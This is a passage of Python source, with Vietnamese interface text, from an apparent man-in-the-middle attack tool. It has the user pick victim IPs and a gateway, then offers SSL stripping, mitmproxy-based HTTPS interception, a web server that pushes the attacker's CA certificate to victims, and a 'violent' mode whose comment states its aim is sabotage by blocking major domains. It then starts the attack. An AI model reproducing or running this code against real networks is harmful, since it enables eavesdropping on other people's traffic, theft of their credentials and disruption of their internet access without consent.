            print("[-] Không có nạn nhân nào phù hợp để tấn công (đã loại trừ gateway).")
            return
        victim_ips = dummy_attacker._select_targets_from_menu(victim_targets, "CHỌN NẠN NHÂN (VICTIM)")
        if not victim_ips:
            print("[-] Đã hủy tấn công.")
            return

        # 3. Chọn gateway
        gateway_targets = [t for t in all_targets if t not in victim_ips]
        gateway_ip = dummy_attacker._select_targets_from_menu(gateway_targets, "CHỌN GATEWAY (ROUTER)")[0] # Chỉ chọn 1 gateway
        if not gateway_ip:
            print("[-] Đã hủy tấn công.")
            return

        # 4. Hỏi về các kỹ thuật tấn công HTTP/HTTPS
        enable_ssl_strip = kwargs.pop('enable_ssl_stripping', False)
        enable_ssl_intercept = kwargs.pop('enable_ssl_interception', False)
        enable_violent_mode = kwargs.pop('enable_violent_mode', False)

        print("\n=== CHỌN KỸ THUẬT TẤN CÔNG HTTP/HTTPS ===")
        print("1. Không can thiệp HTTP/HTTPS (Chỉ nghe lén thông thường)")
        print("2. SSL Stripping (Hạ cấp HTTPS -> HTTP, không hiệu quả với HSTS)")
        print("3. SSL Interception (Giải mã & Ghi log, yêu cầu cài đặt CA)")
        print(f"4. {Fore.RED}SSL Interception (Chế độ 'Bạo lực' - Chặn các domain lớn){Style.RESET_ALL}")

        while True:
            choice = input("\nChọn kỹ thuật (1-4): ")
            if choice == '1':
                break
            elif choice == '2':
                if NetfilterQueue is not None:
                    enable_ssl_strip = True
                    print("[+] Đã chọn SSL Stripping.")
                    break
                else:
                    print("[!] Lỗi: Thư viện 'netfilterqueue' chưa được cài đặt (pip install netfilterqueue). Vui lòng chọn lại.")
            elif choice == '3':
                # Kiểm tra lại mitmproxy ở đây để đảm bảo
                venv_mitmdump_path = os.path.join(os.path.dirname(sys.executable), 'mitmdump')
                is_in_venv = os.path.exists(venv_mitmdump_path)
                is_in_path = shutil.which('mitmdump') is not None

                if is_in_venv or is_in_path:
                    enable_ssl_intercept = True
                    print("[+] Đã chọn SSL Interception.")
                    print(f"{Fore.YELLOW}[!] CẢNH BÁO: Để giải mã thành công, bạn PHẢI cài đặt chứng chỉ CA của mitmproxy")
                    print(f"    lên thiết bị nạn nhân. Chứng chỉ thường nằm ở: ~/.mitmproxy/mitmproxy-ca-cert.pem{Style.RESET_ALL}")
                    
                    cert_server_choice = input("\n[?] Bạn có muốn khởi động web server để hỗ trợ gửi chứng chỉ CA cho nạn nhân không? (y/N): ").lower()
                    if cert_server_choice == 'y':
                        kwargs['start_cert_server'] = True

                    break
                else:
                    print("[!] Lỗi: Công cụ 'mitmproxy' chưa được cài đặt. Vui lòng:")
                    print("    1. Đảm bảo bạn đã kích hoạt virtual environment (source venv/bin/activate).")
                    print("    2. Chạy 'pip install mitmproxy'.")
                    print("    3. Nếu vẫn lỗi, thử chạy lại bằng 'sudo -E venv/bin/python cli.py'.")
                    # Không cho phép chọn lại vì lỗi này cần người dùng sửa bên ngoài
                    return
            elif choice == '4':
                if dummy_attacker.mitmdump_path:
                    enable_ssl_intercept = True  # Chế độ bạo lực cũng là một dạng intercept
                    enable_violent_mode = True
                    print(f"{Fore.RED}[+] Đã chọn chế độ 'Bạo lực'.{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}[!] CẢNH BÁO: Chế độ này sẽ chặn kết nối HTTPS bằng cách trình bày một chứng chỉ không đáng tin cậy.")
                    print(f"{Fore.YELLOW}[!] Nạn nhân sẽ thấy các cảnh báo bảo mật nghiêm trọng trên trình duyệt, gây gián đoạn truy cập.{Style.RESET_ALL}")
                    print(f"{Fore.CYAN}[*] Các kết nối đến domain lớn (Google, Facebook, etc.) sẽ bị chặn hoàn toàn.{Style.RESET_ALL}")
                    # Không yêu cầu cài đặt CA, vì mục đích là phá hoại, không phải nghe lén tàng hình.
                    break
                else:
                    print("[!] Lỗi: Công cụ 'mitmproxy' chưa được cài đặt để chạy chế độ này.")
                    return
            else:
                print("Lựa chọn không hợp lệ.")

        # 5. Khởi tạo và bắt đầu tấn công
        start_cert_server = kwargs.pop('start_cert_server', False)
        attacker = MitmAttacker(interface, victim_ips, gateway_ip, 
                                enable_ssl_stripping=enable_ssl_strip, 
                                enable_ssl_interception=enable_ssl_intercept,
                                enable_violent_mode=enable_violent_mode, **kwargs)
        
        # Khởi động server CA nếu được yêu cầu
        if start_cert_server:
            attacker._start_ca_delivery_server(attacker.attacker_ip)

        if attacker.start_attack():
            try:
                while attacker.is_attacking():
                    time.sleep(1)
            except KeyboardInterrupt:
                print("\n[*] Người dùng yêu cầu dừng...")
        
        attacker.stop_attack()

    except KeyboardInterrupt:
        print("\n[*] Hủy tấn công.")
    except Exception as e:
        logging.error(f"Lỗi không mong muốn trong MitM: {e}")
